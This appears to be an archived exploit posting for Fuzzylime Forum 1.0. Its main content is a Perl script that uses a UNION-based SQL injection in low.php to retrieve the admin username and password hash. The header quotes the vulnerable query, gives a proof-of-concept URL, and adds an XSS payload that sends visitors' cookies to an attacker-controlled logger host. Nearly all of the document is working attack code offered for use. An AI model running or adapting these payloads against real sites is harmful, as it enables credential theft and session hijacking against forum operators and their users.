<html><head><title>Fuzzylime Forum 1.0 (low.php topic) Remote SQL Injection Exploit</title></head><pre>#!/usr/bin/perl -w

#################################################################################
#										#
#		   Fuzzylime Forum 1.0 SQL Injection Exploit			#
#										#
# Discovered by: Silentz							#
# Payload: Admin Username &amp; Hash Retrieval					#
# Website: http://www.w4ck1ng.com						#
# 										#
# Vulnerable Code (low.php): 							#
#										#
#      $gettopicid = mysql_query(&quot;SELECT * FROM ${table_prefix}threads 		#
#      WHERE threadid='$_GET[topic]'&quot;);						#
#										#
# PoC: http://victim.com/low.php?topic=' UNION SELECT 0,0,0,CONCAT(CHAR(58),	#
#      username,CHAR(58),password),0,0,0,0,0 FROM flforum_users WHERE 		#
#      userid=1/*								#
# 										#
# Subject To: magic_quotes_gpc set to off					#
# GoogleDork: Get your own!							#
#										#
# Shoutz: The entire w4ck1ng community						#
#										#
# NOTE: You can also grab the username &amp; hash via a cookie logger and this XSS:	#
#										#
#	http://victim.com/low.php?topic=&quot;&gt;&lt;script&gt;document.location=		#
#       &quot;http://attacker.com/logger.php?var=&quot;+document.cookie&lt;/script&gt;		#
#										#
#################################################################################

use LWP::UserAgent;
die &quot;Example: exploit.pl http://victim.com/\n&quot; unless @ARGV;

$b = LWP::UserAgent-&gt;new() or die &quot;Could not initialize browser\n&quot;;
$b-&gt;agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');

$host = $ARGV[0] . &quot;low.php?topic=' UNION SELECT 0,0,0,CONCAT(CHAR(58),username,CHAR(58),password),0,0,0,0,0 FROM flforum_users WHERE userid=1/*&quot;;

$res = $b-&gt;request(HTTP::Request-&gt;new(GET=&gt;$host));
$answer = $res-&gt;content;

if ($answer =~ /raquo; :(.*?):/){
	print &quot;\nBrought to you by w4ck1ng.com...\n&quot;;
	print &quot;\n[+] Admin User : $1&quot;;
}

if ($answer =~/([0-9a-fA-F]{32})/){print &quot;\n[+] Admin Hash : $1\n&quot;;}

else{print &quot;\n[-] Exploit Failed...\n&quot;;}

# milw0rm.com [2007-06-12]</pre></html>